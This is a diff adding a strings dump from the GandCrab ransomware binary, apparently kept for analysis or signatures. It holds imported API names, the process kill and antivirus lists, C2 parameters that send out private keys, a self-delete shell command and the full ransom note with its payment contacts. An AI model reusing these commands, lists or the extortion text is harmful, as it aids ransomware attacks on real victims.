@@ -1,0 +1,345 @@
+!This 
+m cannot be run in DOS mode.
+:4Rich
+`.rdata
+@.data
+@.rsrc
+@.reloc
+SVWj@h
+D$DP,Z
+<}tK<=tBF
+<}t)F<=t
+HthHuo
+<}tcG<=t
+SVWj@h
+SVWj@h
+D$$PQh
+D$$PWh
+D$$PWh
+SVWj@h
+SVWj@h
+QSVWj@h
+0SWj@h
+fv@_fvg&gv
+Pfvm<fv
+Jevr>fvU1fv
+=fv1Zevh
+gvd(gvu
+uhvQ:fvY
+fvG]fv
+fv- bv
+L&&jl66Z~??A
+Oh44\Q
+sb11S*
+uB!!c 
+D""fT**~;
+;d22Vt::N
+J%%o\..r8
+gg}V++
+jL&&Zl66A~??
+Sb11?*
+tX,,.4
+RRMv;;a
+MMUf33
+PPDx<<
+cB!!0 
+~~Gz==
+fD""~T**
+Vd22Nt::
+xxoJ%%r\..$8
+tt!>
+ppB|>>
+aa_j55
+UUxP((z
+&jL&6Zl6?A~?
+~=Gz=d
+"fD"*~T*
+2Vd2:Nt:
+x%oJ%.r\.
+t!>K
+a5_j5W
+=&&jL66Zl??A~
+g99KrJJ
+pub_key
+DELETE}
+{DELETE}
+Fatal error
+Fatal error: rsaenh.dll is not initialized as well
+advapi32.dll
+CheckTokenMembership
+Address:
+fabian wosar <3
+Can't find server
+aeriedjD#shasj
+*******************
+RtlComputeCrc32
+GandCrabGandCrabnomoreransom.coinomoreransom.bit
+encryption.dll
+_ReflectiveLoader@0
+ExitProcess
+lstrlenA
+HeapAlloc
+HeapFree
+GetProcessHeap
+GetProcAddress
+VirtualAlloc
+GetModuleHandleA
+lstrcpyA
+GetEnvironmentVariableW
+GetFileSize
+MapViewOfFile
+UnmapViewOfFile
+GetModuleHandleW
+WriteFile
+GetModuleFileNameW
+CreateFileW
+ExitThread
+lstrlenW
+GetTempPathW
+CreateFileMappingW
+lstrcatW
+CloseHandle
+CreateThread
+VirtualFree
+lstrcmpiW
+lstrcmpiA
+SetFilePointer
+GetFileAttributesW
+ReadFile
+GetLastError
+MoveFileW
+lstrcpyW
+SetFileAttributesW
+CreateMutexW
+GetDriveTypeW
+VerSetConditionMask
+WaitForSingleObject
+GetTickCount
+InitializeCriticalSection
+OpenProcess
+GetSystemDirectoryW
+TerminateThread
+TerminateProcess
+VerifyVersionInfoW
+WaitForMultipleObjects
+DeleteCriticalSection
+ExpandEnvironmentStringsW
+CreateProcessW
+SetHandleInformation
+lstrcatA
+MultiByteToWideChar
+CreatePipe
+Process32FirstW
+Process32NextW
+CreateToolhelp32Snapshot
+LeaveCriticalSection
+EnterCriticalSection
+FindFirstFileW
+lstrcmpW
+FindClose
+FindNextFileW
+GetNativeSystemInfo
+GetComputerNameW
+GetDiskFreeSpaceW
+GetWindowsDirectoryW
+GetVolumeInformationW
+LoadLibraryA
+KERNEL32.dll
+DispatchMessageW
+DefWindowProcW
+UpdateWindow
+SendMessageW
+CreateWindowExW
+ShowWindow
+SetWindowLongW
+LoadIconW
+RegisterClassExW
+TranslateMessage
+wsprintfW
+BeginPaint
+LoadCursorW
+GetMessageW
+DestroyWindow
+EndPaint
+MessageBoxA
+GetForegroundWindow
+USER32.dll
+TextOutW
+GDI32.dll
+RegCloseKey
+RegCreateKeyExW
+RegSetValueExW
+AllocateAndInitializeSid
+FreeSid
+CryptExportKey
+CryptAcquireContextW
+CryptGetKeyParam
+CryptReleaseContext
+CryptImportKey
+CryptEncrypt
+CryptGenKey
+CryptDestroyKey
+GetUserNameW
+RegQueryValueExW
+RegOpenKeyExW
+ADVAPI32.dll
+ShellExecuteExW
+ShellExecuteW
+SHGetSpecialFolderPathW
+SHELL32.dll
+CryptStringToBinaryA
+CryptBinaryToStringA
+CRYPT32.dll
+InternetOpenW
+InternetReadFile
+InternetConnectW
+HttpSendRequestW
+HttpAddRequestHeadersW
+HttpOpenRequestW
+InternetCloseHandle
+WININET.dll
+GetDeviceDriverBaseNameW
+EnumDeviceDrivers
+PSAPI.DLL
+IsProcessorFeaturePresent
+jjjjjj
+AppData
+\Microsoft\
+GandCrab!
+win32app
+firefox
+ransom_id
+os_bit
+os_major
+pc_keyb
+pc_lang
+pc_group
+pc_name
+pc_user
+ransom_id=
+{USERID}
+Global\
+msftesql.exe
+sqlagent.exe
+sqlbrowser.exe
+sqlservr.exe
+sqlwriter.exe
+oracle.exe
+ocssd.exe
+dbsnmp.exe
+synctime.exe
+mydesktopqos.exe
+agntsvc.exeisqlplussvc.exe
+xfssvccon.exe
+mydesktopservice.exe
+ocautoupds.exe
+agntsvc.exeagntsvc.exe
+agntsvc.exeencsvc.exe
+firefoxconfig.exe
+tbirdconfig.exe
+ocomm.exe
+mysqld.exe
+mysqld-nt.exe
+mysqld-opt.exe
+dbeng50.exe
+sqbcoreservice.exe
+excel.exe
+infopath.exe
+msaccess.exe
+mspub.exe
+onenote.exe
+outlook.exe
+powerpnt.exe
+steam.exe
+thebat.exe
+thebat64.exe
+thunderbird.exe
+visio.exe
+winword.exe
+wordpad.exe
+/c timeout -c 5 & del "%s" /f /q
+cmd.exe
+Content-Type: application/x-www-form-urlencoded
+curl.php?token=
+action=result&e_files=%d&e_size=%I64u&e_time=%d&
+action=call&
+&pub_key=
+&priv_key=
+&version=2.3r
+Microsoft Enhanced Cryptographic Provider v1.0
+\ProgramData\
+\Program Files\
+\Tor Browser\
+Ransomware
+\All Users\
+\Local Settings\
+:\Windows\
+desktop.ini
+autorun.inf
+ntuser.dat
+iconcache.db
+bootsect.bak
+boot.ini
+ntuser.dat.log
+thumbs.db
+GDCB-DECRYPT.txt
+%s\GDCB-DECRYPT.txt
+ipv4bot.whatismyipaddress.com
+undefined
+Domain
+SYSTEM\CurrentControlSet\services\Tcpip\Parameters
+WORKGROUP
+LocaleName
+Control Panel\International
+Keyboard Layout\Preload
+00000419
+productName
+SOFTWARE\Microsoft\Windows NT\CurrentVersion
+SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion
+Itanium
+Unknown
+ProcessorNameString
+HARDWARE\DESCRIPTION\System\CentralProcessor\0
+Identifier
+2ntdll.dll
+UNKNOWN
+NO_ROOT_DIR
+REMOVABLE
+REMOTE
+RAMDISK
+%I64u/
+AVP.EXE
+ekrn.exe
+avgnt.exe
+ashDisp.exe
+NortonAntiBot.exe
+Mcshield.exe
+avengine.exe
+cmdagent.exe
+smc.exe
+persfw.exe
+pccpfw.exe
+fsguiexe.exe
+cfp.exe
+msmpeng.exe
+HTTP/1.1
+---= GANDCRAB =--- 
+Attention! 
+All your files documents, photos, databases and other important files are encrypted and have the extension: .GDCB 
+The only method of recovering files is to purchase a private key. It is on our server and only we can recover your files. 
+The server with your key is in a closed network TOR. You can get there by the following ways: 
+1. Download Tor browser - https://www.torproject.org/ 
+2. Install Tor browser 
+3. Open Tor Browser 
+4. Open link in tor browser: http://gdcbghvjyqy7jclk.onion/3a23db8448d3b2b                         
+5. Follow the instructions on this page 
+                         
+On our page you will see instructions on payment and get the opportunity to decrypt 1 file for free. 
+If you can't download TOR and use it, or in your country TOR blocked, read it:
+1. Visit https://tox.chat/download.html
+2. Download and install qTOX on your PC.
+3. Open it, click "New Profile" and create profile.
+4. Search our contact - 6C5AD4057E594E090E0C987B3089F74335DA75F04B7403E0575663C261349569F64D28CDCF45
+5. In message please write your ID and wait our answer: 3a23db8448d3b2b                            
+DANGEROUS! 
+Do not try to modify files or use your own private key - this will result in the loss of your data forever! 
